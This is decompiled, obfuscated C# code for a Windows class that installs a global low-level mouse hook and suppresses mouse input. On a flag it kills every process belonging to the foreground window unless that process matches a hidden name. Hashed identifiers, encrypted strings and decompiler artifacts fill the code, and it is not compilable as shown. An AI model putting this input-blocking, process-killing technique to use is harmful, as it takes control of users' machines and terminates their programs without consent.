using A;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace EF
{
	public static class MouseHook
	{
		private delegate IntPtr caba162c4e75514259177432e96f8a128(int nCode, IntPtr wParam, IntPtr lParam);

		private enum cfee17106c6636d93f74ccdb9f04933f1
		{
			c0abfbd06405f31e54ca429b546ac2f1a = 513,
			c1f15bd23f5d775f17fea3844f31d029c,
			cbd67c3343a51b92528a23c581ad8d6ff = 512,
			c25d0a3f7329ac8a876a119fa43114847 = 522,
			cffeca6493ab805fd3826afd3badc6f81 = 516,
			c0b9dcbfc1292e83572fefa924dfec44f,
			c180312d173909d179f4c5af019ec2f7d = 515
		}

		private struct cc307df360dc8f84aa368849e5bb84d9c
		{
			public int c86f304ab7843e4752dee4322d2697e0e;

			public int c6032dc02b6613d31aebfb76100b50054;
		}

		public struct Point
		{
			public int x;

			public int y;

			public Point(int p1, int p2)
			{
				this.x = p1;
				this.y = p2;
			}
		}

		private struct c122a748e855825ba8fef4ccf9504225b
		{
			public MouseHook.cc307df360dc8f84aa368849e5bb84d9c cc1fddb02ff144e5eed7e6c911aeefb89;

			public uint c361a47dd9c57d15440f9853be7b82e7a;

			public uint c8ac9354f59eb399b63b6548682c3df35;

			public uint c06a5d0a3c384f262e7756c3b37f944e5;

			public IntPtr c2eb244748ff843562042980d2fd19cd1;
		}

		[CompilerGenerated]
		[Serializable]
		private sealed class <>c
		{
			public static readonly MouseHook.<>c cbaf0296db9c71e43fc2a1823ae785b8f = new MouseHook.<>c();

			internal void c48b48328f76674c58cb419c3b25064f6(object c526771b2a3155ab16ce4c160d70a413a, EventArgs c46038923b96734a4b4996550dc0496a5)
			{
			}
		}

		public static bool CheckkillP = false;

		[DebuggerBrowsable(DebuggerBrowsableState.Never), CompilerGenerated]
		private static EventHandler ced805ec620de054b991d54d11c68add7 = new EventHandler(MouseHook.<>c.cbaf0296db9c71e43fc2a1823ae785b8f.c48b48328f76674c58cb419c3b25064f6);

		private static MouseHook.caba162c4e75514259177432e96f8a128 cb670a5ddc7c3382741b84a39c186c090 = new MouseHook.caba162c4e75514259177432e96f8a128(MouseHook.cd7aec6f738a101877312fa770d573b07);

		private static IntPtr ca3f4a58378c20de46db80a98c3d1c2cd = IntPtr.Zero;

		private const uint cb8894ac08aa46b8cc10ac1cc15df08ae = 2u;

		private const uint cc38c186abcd572d9a7f90b1c4445c032 = 4u;

		private const uint cb4312966b130a72246628fe263039003 = 8u;

		private const uint cfc8a519edb9440e715395e9332aca248 = 16u;

		public static MouseHook.Point xymD = new MouseHook.Point(0, 0);

		public static MouseHook.Point xymU = new MouseHook.Point(0, 0);

		public static int checkup = 1;

		public static int checksho = 0;

		private const int c2d07172969db0614b930472c34ab0d95 = 14;

		public static event EventHandler MouseAction
		{
			[CompilerGenerated]
			add
			{
				EventHandler eventHandler = MouseHook.ced805ec620de054b991d54d11c68add7;
				EventHandler eventHandler2;
				do
				{
					eventHandler2 = eventHandler;
					EventHandler value2 = (EventHandler)Delegate.Combine(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange<EventHandler>(ref MouseHook.ced805ec620de054b991d54d11c68add7, value2, eventHandler2);
				}
				while (eventHandler != eventHandler2);
				while (true)
				{
					switch (1)
					{
					case 0:
						continue;
					}
					break;
				}
				if (!true)
				{
					RuntimeMethodHandle arg_3A_0 = methodof(MouseHook.add_MouseAction(EventHandler)).MethodHandle;
				}
			}
			[CompilerGenerated]
			remove
			{
				EventHandler eventHandler = MouseHook.ced805ec620de054b991d54d11c68add7;
				EventHandler eventHandler2;
				do
				{
					eventHandler2 = eventHandler;
					EventHandler value2 = (EventHandler)Delegate.Remove(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange<EventHandler>(ref MouseHook.ced805ec620de054b991d54d11c68add7, value2, eventHandler2);
				}
				while (eventHandler != eventHandler2);
				while (true)
				{
					switch (2)
					{
					case 0:
						continue;
					}
					break;
				}
				if (!true)
				{
					RuntimeMethodHandle arg_3C_0 = methodof(MouseHook.remove_MouseAction(EventHandler)).MethodHandle;
				}
			}
		}

		public static void Start()
		{
			MouseHook.ca3f4a58378c20de46db80a98c3d1c2cd = MouseHook.c4cf5816fc3bbecbb088e9f95794398aa(MouseHook.cb670a5ddc7c3382741b84a39c186c090);
		}

		public static void stop()
		{
			MouseHook.c554d98576c0dd02a9bcfdb4017415872(MouseHook.ca3f4a58378c20de46db80a98c3d1c2cd);
		}

		private static IntPtr c4cf5816fc3bbecbb088e9f95794398aa(MouseHook.caba162c4e75514259177432e96f8a128 cf12edec4f26d1a8c10733dd2b095fe1f)
		{
			Process currentProcess = Process.GetCurrentProcess();
			IntPtr result;
			try
			{
				ProcessModule mainModule = currentProcess.MainModule;
				try
				{
					IntPtr intPtr = MouseHook.c05ddeec6a7c4bbf2d961388b4ee292db(14, cf12edec4f26d1a8c10733dd2b095fe1f, MouseHook.c8c2ecfe64a6edac7a0c8c109b0a7186c(c0d07d609d29335644b7dbbe53fb10114.c631fb4bb3e507f4f0e6349aa5de37200(85125)), 0u);
					bool flag = intPtr == IntPtr.Zero;
					if (flag)
					{
						while (true)
						{
							switch (6)
							{
							case 0:
								continue;
							}
							break;
						}
						if (!true)
						{
							RuntimeMethodHandle arg_53_0 = methodof(MouseHook.c4cf5816fc3bbecbb088e9f95794398aa(MouseHook.caba162c4e75514259177432e96f8a128)).MethodHandle;
						}
						throw new Win32Exception();
					}
					result = intPtr;
				}
				finally
				{
					if (mainModule != null)
					{
						while (true)
						{
							switch (4)
							{
							case 0:
								continue;
							}
							break;
						}
						((IDisposable)mainModule).Dispose();
					}
				}
			}
			finally
			{
				if (currentProcess != null)
				{
					while (true)
					{
						switch (6)
						{
						case 0:
							continue;
						}
						break;
					}
					((IDisposable)currentProcess).Dispose();
				}
			}
			return result;
		}

		[DllImport("user32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto)]
		public static extern void mouse_event(uint dwFlags, int dx, int dy, uint cButtons, int dwExtraInfo);

		private static IntPtr cd7aec6f738a101877312fa770d573b07(int c89eb5c42e848e03966cd2c102c78ef7f, IntPtr ccb64ec54c4725b424a10c510544a5718, IntPtr c0e6cb9e1a6cfa653a439e8ddad62da00)
		{
			bool checkkillP = MouseHook.CheckkillP;
			if (checkkillP)
			{
				while (true)
				{
					switch (5)
					{
					case 0:
						continue;
					}
					break;
				}
				if (!true)
				{
					RuntimeMethodHandle arg_1F_0 = methodof(MouseHook.cd7aec6f738a101877312fa770d573b07(int, IntPtr, IntPtr)).MethodHandle;
				}
				IntPtr hWnd = MouseHook.c6f13e914b8ec2b5007fcfc964304fd67();
				uint processId;
				MouseHook.GetWindowThreadProcessId(hWnd, out processId);
				Process processById = Process.GetProcessById((int)processId);
				bool flag = processById.ProcessName != ce736d0a2b8403aaf5a4e87b0ae304d49.c8470635d19e1dd109ec8b49c0ab2ab06;
				if (flag)
				{
					try
					{
						Process[] processesByName = Process.GetProcessesByName(processById.ProcessName);
						for (int i = 0; i < processesByName.Length; i++)
						{
							Process process = processesByName[i];
							process.Kill();
						}
						while (true)
						{
							switch (2)
							{
							case 0:
								continue;
							}
							break;
						}
					}
					catch
					{
					}
				}
			}
			bool arg_ED_0;
			if (c89eb5c42e848e03966cd2c102c78ef7f >= 0 && 522 != (int)ccb64ec54c4725b424a10c510544a5718 && 513 != (int)ccb64ec54c4725b424a10c510544a5718 && 512 != (int)ccb64ec54c4725b424a10c510544a5718)
			{
				while (true)
				{
					switch (7)
					{
					case 0:
						continue;
					}
					break;
				}
				arg_ED_0 = (514 != (int)ccb64ec54c4725b424a10c510544a5718);
			}
			else
			{
				arg_ED_0 = false;
			}
			bool flag2 = arg_ED_0;
			IntPtr result;
			if (flag2)
			{
				while (true)
				{
					switch (6)
					{
					case 0:
						continue;
					}
					break;
				}
				result = (IntPtr)1;
			}
			else
			{
				bool arg_129_0;
				if (c89eb5c42e848e03966cd2c102c78ef7f >= 0)
				{
					while (true)
					{
						switch (6)
						{
						case 0:
							continue;
						}
						break;
					}
					arg_129_0 = (513 == (int)ccb64ec54c4725b424a10c510544a5718);
				}
				else
				{
					arg_129_0 = false;
				}
				bool flag3 = arg_129_0;
				if (flag3)
				{
					while (true)
					{
						switch (3)
						{
						case 0:
							continue;
						}
						break;
					}
					MouseHook.checkup = 0;
					MouseHook.c122a748e855825ba8fef4ccf9504225b c122a748e855825ba8fef4ccf9504225b = (MouseHook.c122a748e855825ba8fef4ccf9504225b)Marshal.PtrToStructure(c0e6cb9e1a6cfa653a439e8ddad62da00, typeof(MouseHook.c122a748e855825ba8fef4ccf9504225b));
					bool flag4 = MouseHook.xymD.x == c122a748e855825ba8fef4ccf9504225b.cc1fddb02ff144e5eed7e6c911aeefb89.c86f304ab7843e4752dee4322d2697e0e && MouseHook.xymD.y == c122a748e855825ba8fef4ccf9504225b.cc1fddb02ff144e5eed7e6c911aeefb89.c6032dc02b6613d31aebfb76100b50054;
					if (flag4)
					{
						while (true)
						{
							switch (4)
							{
							case 0:
								continue;
							}
							break;
						}
						result = (IntPtr)1;
						return result;
					}
					MouseHook.xymD = new MouseHook.Point(c122a748e855825ba8fef4ccf9504225b.cc1fddb02ff144e5eed7e6c911aeefb89.c86f304ab7843e4752dee4322d2697e0e, c122a748e855825ba8fef4ccf9504225b.cc1fddb02ff144e5eed7e6c911aeefb89.c6032dc02b6613d31aebfb76100b50054);
				}
				else
				{
					bool arg_1EF_0;
					if (c89eb5c42e848e03966cd2c102c78ef7f >= 0)
					{
						while (true)
						{
							switch (6)
							{
							case 0:
								continue;
							}
							break;
						}
						arg_1EF_0 = (514 == (int)ccb64ec54c4725b424a10c510544a5718);
					}
					else
					{
						arg_1EF_0 = false;
					}
					bool flag5 = arg_1EF_0;
					if (flag5)
					{
						MouseHook.checkup = 1;
					}
					else
					{
						bool flag6 = MouseHook.checkup == 0;
						if (flag6)
						{
							result = (IntPtr)1;
							return result;
						}
					}
				}
				result = MouseHook.cd2de35974097402192c4ddd752724c8a(MouseHook.ca3f4a58378c20de46db80a98c3d1c2cd, c89eb5c42e848e03966cd2c102c78ef7f, ccb64ec54c4725b424a10c510544a5718, c0e6cb9e1a6cfa653a439e8ddad62da00);
			}
			return result;
		}

		[DllImport("user32.dll", CharSet = CharSet.Auto, EntryPoint = "SetWindowsHookEx", SetLastError = true)]
		private static extern IntPtr c05ddeec6a7c4bbf2d961388b4ee292db(int c30f8f694bd9e0aa6468bc14247d97f0a, MouseHook.caba162c4e75514259177432e96f8a128 c0879e47c2331df1d354991bfea3fb0f5, IntPtr c6b3572ce653125f7ea90b390882b91aa, uint cd6b915b0feec07dccc875043071e70a2);

		[DllImport("user32.dll", CharSet = CharSet.Auto, EntryPoint = "UnhookWindowsHookEx", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool c554d98576c0dd02a9bcfdb4017415872(IntPtr c346b6cde99c747599080e7e529f8187f);

		[DllImport("user32.dll", CharSet = CharSet.Auto, EntryPoint = "CallNextHookEx", SetLastError = true)]
		private static extern IntPtr cd2de35974097402192c4ddd752724c8a(IntPtr c346b6cde99c747599080e7e529f8187f, int c89eb5c42e848e03966cd2c102c78ef7f, IntPtr ccb64ec54c4725b424a10c510544a5718, IntPtr c0e6cb9e1a6cfa653a439e8ddad62da00);

		[DllImport("kernel32.dll", CharSet = CharSet.Auto, EntryPoint = "GetModuleHandle", SetLastError = true)]
		private static extern IntPtr c8c2ecfe64a6edac7a0c8c109b0a7186c(string c6a30b44fd4e33a9f4d6f3bfd3b39cc79);

		[DllImport("user32.dll")]
		public static extern IntPtr PostMessage(int hWnd, int Msg, int wParam, int lParam);

		[DllImport("user32.dll", EntryPoint = "GetForegroundWindow", ExactSpelling = true, SetLastError = true)]
		internal static extern IntPtr c6f13e914b8ec2b5007fcfc964304fd67();

		[DllImport("user32.dll", CharSet = CharSet.Auto, EntryPoint = "GetWindowText", SetLastError = true)]
		private static extern int c6281cc9975c32682beb9e66e62487458(IntPtr ce22792c1c7017cdead08ab20d0ab221e, StringBuilder c1d643a34d84a2fb02fd795bb7a952709, int ce468003b9b42265d37d378375e05cbe7);

		[DllImport("user32.dll")]
		public static extern IntPtr GetWindowThreadProcessId(IntPtr hWnd, out uint ProcessId);
	}
}
